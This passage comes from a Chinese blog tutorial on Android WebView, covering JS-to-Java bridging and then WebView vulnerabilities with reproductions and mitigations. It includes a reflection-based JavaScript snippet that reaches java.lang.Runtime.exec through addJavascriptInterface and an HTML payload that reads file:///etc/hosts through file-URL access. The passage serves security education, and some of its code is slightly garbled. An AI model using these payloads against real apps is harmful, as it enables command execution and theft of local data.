可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                                                  HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                                                  Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line">                                                  Log.e(<span class="string">&quot;WindXaa&quot;</span>,params.get(<span class="number">0</span>)+<span class="string">&quot;---&quot;</span>+params.get(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              &#125;</span><br><span class="line"></span><br><span class="line">                                              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                                          &#125;</span><br><span class="line">                                          <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                                      &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>运行程序：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/17.png" alt="image-20220729105941115"></p><p>这里就调用Android代码成功</p><p> <strong><code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code></strong></p><p>在JS中，上面三种方法分别回调l拦截对话框<code>alert()</code>、<code>confirm()</code>、<code>prompt()</code>的信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/18.png" alt="image-20220729110247468"></p><p>Android通过 <code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code>方法回调分别拦截JS对话框（即上述三个方法），得到他们的消息内容，然后解析即可</p><p>然后我们再次编写js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">clickprompt</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 调用prompt（）</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> result=<span class="title function_">prompt</span>(<span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(<span class="string">&quot;demo &quot;</span> + result);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- 点击按钮则调用clickprompt()  --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;clickprompt()&quot;</span>&gt;</span>点击调用Android代码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们编写onJsPrompt 回调方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview3);</span><br><span class="line"></span><br><span class="line">      <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">      webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">      webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 先加载JS代码</span></span><br><span class="line">      <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">      mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript2.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">          <span class="comment">// 拦截输入框(原理同方式2)</span></span><br><span class="line">          <span class="comment">// 参数message:代表promt（）的内容（不是url）</span></span><br><span class="line">          <span class="comment">// 参数result:代表输入框的返回值</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsPrompt</span><span class="params">(WebView view, String url, String message, String defaultValue, JsPromptResult result)</span> &#123;</span><br><span class="line">              <span class="comment">// 根据协议的参数，判断是否是所需要的url(原理同方式2)</span></span><br><span class="line">              <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line"></span><br><span class="line">              <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(message);</span><br><span class="line">              <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">              <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">              <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line">                  <span class="comment">//js://webview?arg1=WindXaa&amp;arg2=attack</span></span><br><span class="line">                  <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                  <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                  <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                      System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                      <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                      HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                      Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                      <span class="comment">//参数result:代表消息框的返回值(输入值)</span></span><br><span class="line">                      result.confirm(<span class="string">&quot;js调用了Android的方法成功啦&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>运行程序：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/19.png" alt="image-20220729143728889"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/20.png" alt="image-20220729143746516"></p><p>我们可以发现这里已经成功的加载了html，然后我们再次点击按钮可以发现通过回调成功的调用了函数，并且显示了弹窗</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/21.png" alt="image-20220729143927623"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/22.png" alt="image-20220729144012571"></p><p>其余两种方法同理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截JS的警告框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.onJsAlert(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截JS的确认框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsConfirm</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.onJsConfirm(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、WebView的漏洞面"><a href="#三、WebView的漏洞面" class="headerlink" title="三、WebView的漏洞面"></a>三、WebView的漏洞面</h2><p>WebView 漏洞在Android APP中占比十分巨大，根据梆梆安全的《2021年移动安全形势分析与2022年研判》中显示，WebView漏洞总和仍然占据目前Android APP漏洞类别前列，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/23.png" alt="image-20220729145936266"></p><p>因此了解和掌握WebView漏洞的原理和技巧是十分重要的</p><h3 id="1-WebView的漏洞面"><a href="#1-WebView的漏洞面" class="headerlink" title="1.WebView的漏洞面"></a>1.WebView的漏洞面</h3><p>谈起WebView漏洞，我们的目光回退到2020年看雪SDC沙龙会议中，来自OPPO实验室的何恩大佬发表的《Android WebView安全攻防指南2020》的演讲，大佬从WebView的<code>本地攻击面、远程攻击面、特殊攻击面</code>共3个角度讲述了WebView漏洞的成因，原文链接：<a href="https://zhuanlan.kanxue.com/article-14155.htm">Android WebView安全攻防指南2020</a>，这里引用大佬的WebView示例图，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/24.png" alt="image-20220729150558039"></p><p>从图中我们可以看出WebView的漏洞攻击面，从引导组件Intent、deeplink，包括了WebView自身的接口，以及一些端口协议等等攻击面</p><h3 id="2-WebView漏洞发展总结"><a href="#2-WebView漏洞发展总结" class="headerlink" title="2.WebView漏洞发展总结"></a>2.WebView漏洞发展总结</h3><p>考虑到WebView漏洞的攻击面十分的杂乱，这里我对WebView漏洞的发展进行了一个梳理总结，如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/25.png" alt="image-20220729152654652"></p><p>下面我们就将一一的讲解每个漏洞的原理并进行复现</p><h2 id="四、WebView的漏洞原理和复现"><a href="#四、WebView的漏洞原理和复现" class="headerlink" title="四、WebView的漏洞原理和复现"></a>四、WebView的漏洞原理和复现</h2><h3 id="1-历史漏洞"><a href="#1-历史漏洞" class="headerlink" title="1.历史漏洞"></a>1.历史漏洞</h3><h4 id="（1）WebView任意代码执行漏洞"><a href="#（1）WebView任意代码执行漏洞" class="headerlink" title="（1）WebView任意代码执行漏洞"></a>（1）WebView任意代码执行漏洞</h4><h5 id="lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞"><a href="#lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞" class="headerlink" title="&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞"></a>&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p><p>我们在上文中讲述过JS和Android直接的通信可以通过<code>addJavascriptInterface</code>接口进行对象映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JSObject</span>(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure><p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p><p>具体的攻击步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass() </span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型Class</span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： Class.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123;  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);          </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><strong>漏洞防护：</strong></p><p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用，如我们上文中实现的便是如此</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/30.png" alt="image-20220729164533455"></p><p>后来这种漏洞越来越少，在当前高版本的手机上基本没有了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/31.png" alt="image-20220729164656332"></p><p>在4.2之前，可以采用拦截prompt（）的方式进行漏洞修复，不过这种版本太过久远，所以我们这里就不细讲了</p><h5 id="lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞"><a href="#lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞" class="headerlink" title="&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞"></a>&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p><p>在Android 3.0以下，Android系统会默认通过<code>searchBoxJavaBridge_</code>的Js接口给 WebView 添加一个JS映射对象：<code>searchBoxJavaBridge_</code>对象，该接口可能被利用，实现远程任意代码。</p><p><strong>安全防护：</strong></p><p>删除<code>searchBoxJavaBridge_</code>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过调用该方法删除接口</span></span><br><span class="line">removeJavascriptInterface（）;</span><br></pre></td></tr></table></figure><p>而<code>accessibility</code>和 <code>accessibilityTraversal</code>接口引起远程代码执行漏洞的原理和这里相似，由于这些漏洞在当前的Android版本上基本不存在，我们不做深入讲解了。</p><h4 id="（2）WebView明文存储漏洞"><a href="#（2）WebView明文存储漏洞" class="headerlink" title="（2）WebView明文存储漏洞"></a>（2）WebView明文存储漏洞</h4><p><strong>漏洞原理：</strong></p><p>WebView默认开启密码保存功能 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure><p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p><p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p><p><strong>安全防护：</strong></p><p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p><h3 id="2-跨域漏洞"><a href="#2-跨域漏洞" class="headerlink" title="2.跨域漏洞"></a>2.跨域漏洞</h3><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)，漏洞产生的原因在Android系统中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p><p>针对WebView的跨域问题，主要是三个重要的API，如下所示：</p><table><thead><tr><th><strong>方法</strong></th><th><strong>作用&#x2F;风险</strong></th><th><strong>默认策略</strong></th></tr></thead><tbody><tr><td>setAllowFileAccess(true);</td><td>设置是否允许 WebView 使用 File 协议</td><td>默认设置为 true</td></tr><tr><td>setAllowFileAccessFromFileURLs(true);</td><td>设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setAllowUniversalAccessFromFileURLs(true);</td><td>设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源)</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setJavaScriptEnabled(true);</td><td>设置是否允许 WebView 使用 JavaScript</td><td>默认不允许</td></tr></tbody></table><h4 id="（1）任意文件窃取1（应用克隆漏洞）"><a href="#（1）任意文件窃取1（应用克隆漏洞）" class="headerlink" title="（1）任意文件窃取1（应用克隆漏洞）"></a>（1）任意文件窃取1（应用克隆漏洞）</h4><p><strong>漏洞原理：</strong></p><p><code>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</code></p><p>这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML&#x2F;JS，并窃取相关的私有文件信息</p><p><strong>漏洞复现：</strong></p><p>首先我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/37.png" alt="image-20220729195648955"></p><p>我们怎么利用WebView的跨域漏洞去访问本地的私有目录</p><p>首先我们编写目标JS文件：</p><p>fileAttack.html</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function <span class="title function_">loadXMLDoc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">arm</span> <span class="operator">=</span> <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              console.log(xmlhttp.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们将文件上传到手机的目录</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/38.png" alt="image-20220729200249055"></p><p>接着我们编写攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这是程序肯定会报错误，因为Android4.1后就默认禁止<code>setAllowFileAccessFromFileURLs(true)</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/39.png" alt="image-20220729200625192"></p><p>然后我们开启<code>setAllowFileAccessFromFileURLs</code>按钮，再次执行</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/40.png" alt="image-20220729200745980"></p><p>我们可以发现现在的Android版本中开始删除了这样的API，这是为了安全性，不过这里我们还是可以使用，于是我们开启API</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/41.png" alt="image-20220729201027637"></p><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h4 id="（2）通用协议漏洞-（恶意页面注入）"><a href="#（2）通用协议漏洞-（恶意页面注入）" class="headerlink" title="（2）通用协议漏洞 （恶意页面注入）"></a>（2）通用协议漏洞 （恶意页面注入）</h4><p><strong>漏洞原理：</strong></p><p><code>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</code></p><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p><p>我们将上面html中的访问改为看雪的网站：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xmlhttp;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">loadXMLDoc</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/42.png" alt="image-20220729202020754"></p><p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p><p><strong>安全防护:</strong></p><ul><li>检查应用是否使用了 webview 